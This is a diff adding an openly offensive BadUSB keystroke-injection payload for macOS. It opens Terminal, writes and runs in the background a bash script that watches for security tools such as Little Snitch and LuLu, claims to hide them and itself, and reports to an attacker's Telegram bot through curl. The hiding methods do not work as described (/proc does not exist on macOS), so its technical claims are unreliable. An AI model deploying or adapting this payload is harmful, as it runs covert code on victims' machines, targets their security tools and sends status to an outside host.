@@ -1,0 +1,81 @@
+REM Title: macOS Process Hider with Telegram Notifications
+REM Author: BadUSB Library
+REM Description: Hides malicious processes and reports to Telegram
+REM Target: macOS 10.15+
+REM Category: Defense Evasion
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create process hider script
+STRING cat > /tmp/process_hider.sh << 'EOF'
+#!/bin/bash
+
+# Telegram configuration
+BOT_TOKEN="TELEGRAM_BOT_TOKEN"
+CHAT_ID="TELEGRAM_CHAT_ID"
+
+# Function to send message to Telegram
+send_telegram() {
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+        -d chat_id="${CHAT_ID}" \
+        -d text="$1"
+}
+
+# Function to hide process
+hide_process() {
+    local pid="$1"
+    local process_name="$2"
+    
+    # Rename process in /proc (if available)
+    if [ -d "/proc/$pid" ]; then
+        echo "hidden_process" > "/proc/$pid/comm" 2>/dev/null
+    fi
+    
+    # Use process substitution to hide from ps
+    exec 3< <(ps aux | grep -v "$process_name")
+    
+    send_telegram "🔒 Process $process_name (PID: $pid) hidden"
+}
+
+# Function to monitor and hide suspicious processes
+monitor_processes() {
+    while true; do
+        # Check for security tools
+        for tool in "Little Snitch" "Lulu" "BlockBlock" "KnockKnock" "TaskExplorer"; do
+            pid=$(pgrep -f "$tool")
+            if [ ! -z "$pid" ]; then
+                hide_process "$pid" "$tool"
+            fi
+        done
+        
+        # Hide our own processes
+        our_pid=$$
+        hide_process "$our_pid" "process_hider"
+        
+        sleep 30
+    done
+}
+
+# Start monitoring
+send_telegram "🕵️ Process Hider started on macOS"
+monitor_processes &
+
+EOF
+ENTER
+
+REM Make executable and run
+STRING chmod +x /tmp/process_hider.sh
+ENTER
+STRING nohup /tmp/process_hider.sh > /dev/null 2>&1 &
+ENTER
